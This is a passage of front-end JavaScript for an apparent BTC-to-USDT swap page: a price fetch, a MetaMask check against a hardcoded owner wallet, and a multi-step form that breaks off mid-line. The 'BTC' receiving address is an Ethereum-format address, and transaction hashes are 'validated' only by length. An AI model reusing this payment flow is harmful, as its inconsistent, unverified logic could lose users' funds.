let btcAmount = 0;
let usdtAmount = 0;
let btcTxHash = "";
let usdtRecipient = "";
const btcWalletAddress = "0x49b06e4a8E75188955d6961520F0a9E2EC1B6634";
const ownerWallet = "0x49b06e4a8E75188955d6961520F0a9E2EC1B6634";

window.addEventListener("load", async () => {
  const walletStatus = document.getElementById("wallet-status");
  if (typeof window.ethereum !== "undefined") {
    try {
      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      const connectedWallet = accounts[0]?.toLowerCase();
      walletStatus.innerText = connectedWallet === ownerWallet.toLowerCase() ? "✅" : "❌";
    } catch {
      walletStatus.innerText = "❌";
    }
  } else {
    walletStatus.innerText = "❌";
  }
});

document.addEventListener("DOMContentLoaded", () => {
  fetch("https://api.coincap.io/v2/assets/bitcoin")
    .then(response => response.json())
    .then(data => {
      const btcPrice = data?.data?.priceUsd;
      const priceElement = document.getElementById("btc-price");
      if (btcPrice) {
        priceElement.innerText = `$${parseFloat(btcPrice).toLocaleString(undefined, { maximumFractionDigits: 2 })}`;
      } else {
        priceElement.innerText = "❌ Price unavailable";
      }
    })
    .catch(() => {
      document.getElementById("btc-price").innerText = "❌ Price unavailable";
    });
});

function manualConnect() {
  if (typeof window.ethereum !== "undefined") {
    window.ethereum.request({ method: "eth_requestAccounts" })
      .then(accounts => {
        const connectedWallet = accounts[0].toLowerCase();
        const walletStatus = document.getElementById("wallet-status");
        walletStatus.innerText = connectedWallet === ownerWallet.toLowerCase() ? "✅" : "❌";
        alert("Wallet manually connected.");
      })
      .catch(() => {
        alert("Manual connection failed.");
      });
  } else {
    alert("MetaMask not detected.");
  }
}

function nextStep1() {
  btcAmount = parseFloat(document.getElementById("btc-amount").value);
  if (!btcAmount || btcAmount <= 0) {
    alert("Enter a valid BTC amount.");
    return;
  }
  document.getElementById("step-1").classList.add("hidden");
  document.getElementById("step-2").classList.remove("hidden");
}

function nextStep2() {
  btcTxHash = document.getElementById("btc-txid").value.trim();
  if (!btcTxHash || btcTxHash.length < 20) {
    alert("Enter a valid BSC transaction hash.");
    return;
  }
  document.getElementById("step-2").classList.add("hidden");
  document.getElementById("step-3").classList.remove("hidden");
}

function finalStep() {
  usdtRecipient = document.getElementById("usdt
